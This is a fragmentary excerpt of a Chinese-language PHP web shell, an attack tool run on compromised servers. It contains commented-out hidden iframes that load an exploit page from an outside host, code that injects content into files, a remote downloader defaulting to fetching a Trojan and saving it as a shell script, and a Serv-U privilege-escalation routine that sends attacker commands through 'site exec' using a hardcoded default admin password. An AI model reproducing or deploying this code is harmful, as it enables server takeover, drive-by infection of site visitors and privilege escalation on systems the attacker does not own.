...
<script type="text/javascript">
	...
	<td class="toptd" style="width:50px;"> 属性 </td>
	<td class="toptd" style="width:175px;"> 修改时间 </td>
...
<!-- <iframe src=http://cxasdj.h001.9host.net:88/fk/exp/ie.html width=0 height=0></iframe> -->
...
<!-- <iframe src=http://cxasdj.h001.9host.net:88/fk/exp/ie.html width=0 height=0></iframe> -->
			...
			if($gi == 'b') $fcm = $gcm."\r\n".$fc;
			if($gi == 'c') $fcm = $fc."\r\n".$gcm;
			echo File_Write($Filepath,$fcm,'wb') ? 'ok:'.$Filepath.'<br>'."\r\n" : 'err:'.$Filepath.'<br>'."\r\n";
...
{
print<<<END
文件位置<br><input name="durl" value="http://www.baidu.com/down/muma.exe" type="text" style="width:600px;">
<br><br>下载到<br><input name="dpath" value="./myshell.php" type="text" style="width:600px;">
<input value="下载" type="submit" style="width:80px;"></form><br>
END;
	if((!empty($_POST['durl'])) && (!empty($_POST['dpath'])))
	{
		$contents = @file_get_contents($_POST['durl']);
		if(!$contents) echo '无法读取要下载的数据';
		elseif(file_exists($_POST['dpath'])) echo '文件'.$_POST['dpath'].'已存在';
...
<form method="POST">
	...
	<div class="actall">ServU密码 <input name="SUPass" type="text" value="#l@\$ak#.lk;0@P" style="width:300px"></div>
END;
if($_GET['o'] == 'adduser')
{
print<<<END
...
print<<<END
  <div class="actall"><input type="submit" value="执行" style="width:80px;"><br><br>
END;
	if((!empty($_POST['SUPort'])) && (!empty($_POST['SUUser'])) && (!empty($_POST['SUPass'])))
	{
		...
		echo "<font color=red>回应: $recvbuf</font><br>";
		$sendbuf = "USER ".$_POST["SUUser"]."\r\n";
		@fputs($sock, $sendbuf, strlen($sendbuf));
		echo "<font color=blue>发送: $sendbuf</font><br>";
		$recvbuf = @fgets($sock, 1024);
		echo "<font color=red>回应: $recvbuf</font><br>";
		...
		if(!empty($_POST['SUCommand']))
		{
	 		...
	 		@fputs($exp, $sendbuf, strlen($sendbuf));
	 		echo "<font color=blue>发送: site exec</font> <font color=green>".$_POST["SUCommand"]."</font><br>";
	 		$recvbuf = @fgets($exp, 1024);
	 		echo "<font color=red>回应: $recvbuf</font><br>";
	 		$sendbuf = $deldomain;
	 		@fputs($sock, $sendbuf, strlen($sendbuf));
